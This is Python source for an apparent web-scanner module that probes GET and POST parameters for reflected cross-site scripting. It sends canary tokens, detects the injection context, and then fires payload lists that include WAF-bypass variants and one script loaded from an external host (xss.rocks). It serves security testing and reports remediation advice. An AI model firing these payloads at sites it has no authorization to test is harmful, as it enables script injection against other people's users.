"""
XSSModule — Real cross-site scripting detection engine.

Approach:
  1. Collect injectable parameters from endpoints (GET + POST)
  2. Send a unique canary token per parameter
  3. Check if the canary reflects in the response UNENCODED
  4. If yes → confirmed reflective sink → test full payload set
  5. Detect context (HTML body / attr / JS / URL) for accurate PoC
  6. Zero false positives: never report unless canary is unencoded in response
"""

import re
import time
import uuid
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    requests = None


# ─── Payload sets by injection context ───────────────────────────────────────

HTML_BODY_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<math><mtext></table><img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<script src=//xss.rocks/xss.js></script>",
    "<input autofocus onfocus=alert(1)>",
    "'-alert(1)-'",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",          # case bypass
    "<!--<script>alert(1)--></script>",
]

HTML_ATTR_PAYLOADS = [
    "\" onmouseover=\"alert(1)",
    "\" onfocus=\"alert(1)\" autofocus=\"",
    "\" onerror=\"alert(1)",
    "' onmouseover='alert(1)",
    "\" onload=\"alert(1)",
    "\"><img src=x onerror=alert(1)>",
    "\" style=\"animation-name:rotation\" onanimationstart=\"alert(1)",
]

JS_CONTEXT_PAYLOADS = [
    "';alert(1)//",
    "\";alert(1)//",
    "\\';alert(1)//",
    "</script><script>alert(1)</script>",
    "'-alert(1)-'",
    "${alert(1)}",
    "};alert(1);//",
]

URL_CONTEXT_PAYLOADS = [
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]

ALL_PAYLOADS = HTML_BODY_PAYLOADS + HTML_ATTR_PAYLOADS + JS_CONTEXT_PAYLOADS + URL_CONTEXT_PAYLOADS

# WAF bypass variants
WAF_BYPASS_PAYLOADS = [
    "<img/src=x onerror=alert(1)>",                   # slash bypass
    "<img src=x oNerRoR=alert(1)>",                   # mixed case
    "<svg/onload=alert(1)>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",    # base64
    "%3Cscript%3Ealert(1)%3C/script%3E",              # URL encoded
    "<scr\x00ipt>alert(1)</scr\x00ipt>",              # null byte
    "<img src=\"x\" onerror=\"&#x61;&#x6C;&#x65;&#x72;&#x74;(1)\">",  # HTML entities
    "<<script>alert(1)//<</script>",
    "<script>window['alert'](1)</script>",
    "<svg><script>alert&#40;1&#41;</script>",
]


from modules import BaseModule


class XSSModule(BaseModule):
    NAME = "XSS Hunter"

    def __init__(self, target, db, ui, context, timeout=10, delay=0.3,
                 threads=10, verbose=False, ai=None, output_dir=None):
        self.target     = target
        self.db         = db
        self.ui         = ui
        self.ctx        = context
        self.timeout    = timeout
        self.delay      = delay
        self.threads    = threads
        self.verbose    = verbose
        self.ai         = ai
        self.output_dir = output_dir
        self.base_url   = self.ctx.get("base_url") or (
            f"https://{target}" if not target.startswith("http") else target
        )
        self.session    = self._make_session()
        self.found      = []

    def _make_session(self):
        if not requests:
            return None
        s = requests.Session()
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        })
        s.verify = False
        return s

    # ─────────────────────────────────────────────────────────────────────────
    def run(self):
        self.ui.section("XSS Hunter — Cross-Site Scripting Detection")
        if not requests:
            self.ui.error("requests not installed. Run: pip install requests")
            return

        # Suppress SSL warnings
        try:
            import urllib3
            urllib3.disable_warnings()
        except Exception:
            pass

        # Collect targets: endpoints from context + base URL
        endpoints = self._collect_endpoints()
        self.ui.info(f"Collected {len(endpoints)} endpoints to test for XSS")

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(self._test_endpoint, ep): ep for ep in endpoints}
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as e:
                    if self.verbose:
                        self.ui.error(f"XSS thread error: {e}")

        if not self.found:
            self.ui.info("No confirmed XSS vulnerabilities found.")
        else:
            self.ui.ok(f"XSS scan complete — {len(self.found)} confirmed finding(s)")

    # ─────────────────────────────────────────────────────────────────────────
    def _collect_endpoints(self):
        """Build a list of (url, method, params) tuples to test."""
        endpoints = []
        seen = set()

        raw_eps = self.ctx.get("endpoints", []) + self.ctx.get("urls", [])
        if not raw_eps:
            raw_eps = [self.base_url]

        # Parse GET params from known URLs
        for ep in raw_eps:
            try:
                if not ep.startswith("http"):
                    ep = self.base_url.rstrip("/") + "/" + ep.lstrip("/")
                parsed = urllib.parse.urlparse(ep)
                qs = urllib.parse.parse_qs(parsed.query)
                if qs:
                    key = parsed.scheme + "://" + parsed.netloc + parsed.path
                    if key not in seen:
                        seen.add(key)
                        endpoints.append({
                            "url": key,
                            "method": "GET",
                            "params": {k: v[0] for k, v in qs.items()},
                            "data": {}
                        })
            except Exception:
                continue

        # Add common parameter probes against the base
        common_params = ["q", "search", "s", "query", "keyword", "name", "id",
                         "page", "url", "redirect", "next", "return", "ref",
                         "input", "text", "comment", "message", "title", "desc",
                         "email", "user", "username", "lang", "cat", "p", "v"]
        for p in common_params:
            key = f"{self.base_url}?{p}=test"
            if key not in seen:
                seen.add(key)
                endpoints.append({
                    "url": self.base_url,
                    "method": "GET",
                    "params": {p: "test"},
                    "data": {}
                })

        # Also probe discovered form endpoints for POST
        form_endpoints = self.ctx.get("forms", [])
        for form in form_endpoints:
            furl = form.get("action", self.base_url)
            inputs = form.get("inputs", {})
            if inputs:
                endpoints.append({
                    "url": furl,
                    "method": form.get("method", "POST").upper(),
                    "params": {},
                    "data": inputs
                })

        return endpoints

    # ─────────────────────────────────────────────────────────────────────────
    def _test_endpoint(self, ep):
        """
        Phase 1: Canary test — send a unique token, check if it reflects unencoded.
        Phase 2: Only if canary reflects → test full payload set.
        """
        url    = ep["url"]
        method = ep["method"]
        params = dict(ep["params"])
        data   = dict(ep["data"])

        all_params = list(params.keys()) + list(data.keys())
        if not all_params:
            return

        for param in all_params:
            canary = f"GR{uuid.uuid4().hex[:8]}"
            in_get  = param in params
            in_post = param in data

            # ── Phase 1: canary reflection check ──
            try:
                test_params = dict(params)
                test_data   = dict(data)
                if in_get:
                    test_params[param] = canary
                else:
                    test_data[param] = canary

                resp = self._send(url, method, test_params, test_data)
                if not resp:
                    continue

                # Canary must appear UNENCODED (not &lt; or %3C etc.)
                if canary not in resp.text:
                    if self.verbose:
                        self.ui.info(f"  No reflection: {url} param={param}")
                    continue

                self.ui.warn(f"Reflection confirmed: {url} | param={param} | method={method}")
                time.sleep(self.delay)

            except Exception as e:
                if self.verbose:
                    self.ui.error(f"Canary error {url}: {e}")
                continue

            # ── Phase 2: determine context & run appropriate payloads ──
            context = self._detect_context(resp.text, canary)
            payload_set = self._payloads_for_context(context)

            confirmed = False
            confirmed_payload = None
            for payload in payload_set:
                try:
                    test_params = dict(params)
                    test_data   = dict(data)
                    if in_get:
                        test_params[param] = payload
                    else:
                        test_data[param] = payload

                    resp2 = self._send(url, method, test_params, test_data)
                    if not resp2:
                        continue

                    if self._payload_executes(resp2.text, payload):
                        confirmed = True
                        confirmed_payload = payload
                        break

                    time.sleep(self.delay)

                except Exception:
                    continue

            # ── If blocked, try WAF bypass ──
            if not confirmed:
                for payload in WAF_BYPASS_PAYLOADS:
                    try:
                        test_params = dict(params)
                        test_data   = dict(data)
                        if in_get:
                            test_params[param] = payload
                        else:
                            test_data[param] = payload
                        resp3 = self._send(url, method, test_params, test_data)
                        if resp3 and self._payload_executes(resp3.text, payload):
                            confirmed = True
                            confirmed_payload = payload
                            break
                        time.sleep(self.delay)
                    except Exception:
                        continue

            if confirmed:
                self._report_finding(url, method, param, confirmed_payload, context,
                                     in_get, params, data)

    # ─────────────────────────────────────────────────────────────────────────
    def _send(self, url, method, params, data):
        try:
            if method == "GET":
                return self.session.get(url, params=params, timeout=self.timeout)
            else:
                return self.session.post(url, data=data, params=params, timeout=self.timeout)
        except RequestException:
            return None

    def _detect_context(self, body, canary):
        """Detect where the canary lands in the HTML."""
        idx = body.find(canary)
        if idx == -1:
            return "html_body"

        snippet = body[max(0, idx-100):idx+100]

        # Inside a <script> block?
        script_open  = body.rfind("<script", 0, idx)
        script_close = body.rfind("</script>", 0, idx)
        if script_open > script_close:
            return "js_context"

        # Inside an HTML attribute?
        tag_open  = body.rfind("<", 0, idx)
        tag_close = body.rfind(">", 0, idx)
        if tag_open > tag_close:
            return "html_attr"

        # Inside a URL attribute (href/src/action)?
        url_pattern = re.compile(r'(href|src|action|data)\s*=\s*["\'][^"\']*', re.I)
        if url_pattern.search(snippet):
            return "url_context"

        return "html_body"

    def _payloads_for_context(self, context):
        mapping = {
            "html_body": HTML_BODY_PAYLOADS,
            "html_attr": HTML_ATTR_PAYLOADS,
            "js_context": JS_CONTEXT_PAYLOADS,
            "url_context": URL_CONTEXT_PAYLOADS,
        }
        return mapping.get(context, HTML_BODY_PAYLOADS)

    def _payload_executes(self, body, payload):
        """
        Check if the payload appears in the response in an executable form.
        Strips HTML encoding to avoid false positives.
        """
        if not body:
            return False

        # Check for unencoded payload presence
        # Key executable fragments that would trigger JS
        exec_markers = [
            "onerror=alert", "onload=alert", "onmouseover=alert",
            "onfocus=alert", "ontoggle=alert", "onanimationstart=alert",
            "<script>alert", "alert(1)", "javascript:alert",
            "onerror=alert(1)", "onload=alert(1)",
        ]
        body_lower = body.lower()
        for marker in exec_markers:
            if marker.lower() in body_lower:
                # Make sure it's not HTML-encoded (&lt; etc.)
                encoded = marker.replace("<", "&lt;").replace(">", "&gt;").lower()
                if encoded not in body_lower:
                    return True

        # Direct unencoded payload match
        if payload in body and "&lt;" not in body[body.find(payload)-5:body.find(payload)+5]:
            # Verify it's not sitting inside a comment
            idx = body.find(payload)
            comment_open  = body.rfind("<!--", 0, idx)
            comment_close = body.rfind("-->", 0, idx)
            if comment_open <= comment_close:
                return True

        return False

    # ─────────────────────────────────────────────────────────────────────────
    def _report_finding(self, url, method, param, payload, context, in_get, params, data):
        """Build a rich finding and add to DB."""
        if in_get:
            poc_params = dict(params)
            poc_params[param] = payload
            qs = urllib.parse.urlencode(poc_params)
            poc_url = f"{url}?{qs}"
        else:
            poc_url = url

        title = f"Reflected XSS in '{param}' parameter ({method})"
        desc  = (
            f"The '{param}' parameter in a {method} request to {url} reflects "
            f"user input unsanitized in the response within a {context.replace('_',' ')} context. "
            f"An attacker can inject arbitrary JavaScript that executes in victim browsers, "
            f"enabling session theft, credential harvesting, or malware delivery."
        )
        remediation = (
            "1. Apply context-aware output encoding (HTML-encode in HTML context, "
            "JS-encode in script context). "
            "2. Implement a strict Content-Security-Policy header. "
            "3. Use HttpOnly and Secure flags on session cookies. "
            "4. Validate/whitelist input server-side."
        )
        evidence = [
            f"Reflection context: {context}",
            f"Confirmed payload: {payload}",
            f"PoC URL: {poc_url}",
            f"Method: {method}",
        ]

        added = self.db.add(
            title=title,
            severity="high",
            url=url,
            module=self.NAME,
            description=desc,
            remediation=remediation,
            cvss="6.1",
            evidence=evidence,
            confidence="high",
        )
        if added:
            self.found.append(url)
            self.ui.find("high", title, url)
            self.ui.bullet(f"Param: {param}  |  Context: {context}", indent=12)
            self.ui.bullet(f"Payload: {payload}", indent=12)
            self.ui.bullet(f"PoC: {poc_url}", indent=12)
            # Store PoC in context for report
            self.ctx.setdefault("xss_pocs", []).append({
                "url": url, "param": param, "payload": payload,
                "method": method, "context": context, "poc_url": poc_url
            })
